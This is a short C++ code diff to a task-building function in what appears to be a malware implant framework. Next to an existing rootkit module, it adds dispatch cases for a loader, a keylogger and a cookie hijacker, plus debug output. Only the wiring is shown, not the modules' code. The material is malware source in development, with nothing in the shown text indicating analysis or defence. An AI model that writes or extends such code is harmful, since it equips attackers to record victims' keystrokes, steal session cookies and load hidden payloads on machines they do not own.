@@ -2,6 +2,9 @@
 
 Task * Task::BuildTask(const std::string & module_name, const json & args)
 {
+    std::cout << "BuildTask module name:" << module_name << std::endl;
+    std::cout << "BuildTask args:" << args.dump() << std::endl;
+
     supported_modules sm = BaseModule::supported_module_for_name(module_name);
     
     if(sm == supported_modules::NUM_OF_MODULES)
@@ -9,7 +12,7 @@ Task * Task::BuildTask(const std::string & module_name, const json & args)
         throw std::runtime_error("Invalid Module");
     }
     
-    BaseModule * module_derived;
+    BaseModule * module_derived = nullptr;
     
     switch (sm)
     {
@@ -22,7 +25,16 @@ Task * Task::BuildTask(const std::string & module_name, const json & args)
     case supported_modules::ROOTKIT:
         module_derived = new Rootkit(module_name, args);
         break;
-    
+    case supported_modules::LOADER:
+        module_derived = new MyLoader(module_name, args);
+        break;
+    case supported_modules::KEY_LOGGER:
+        module_derived = new KeyLogger(module_name, args);
+        break;
+    case supported_modules::COOKIE_HIJACKER:
+        module_derived = new CookieHijacker(module_name, args);
+        break;
+
     default:
         break;
     }
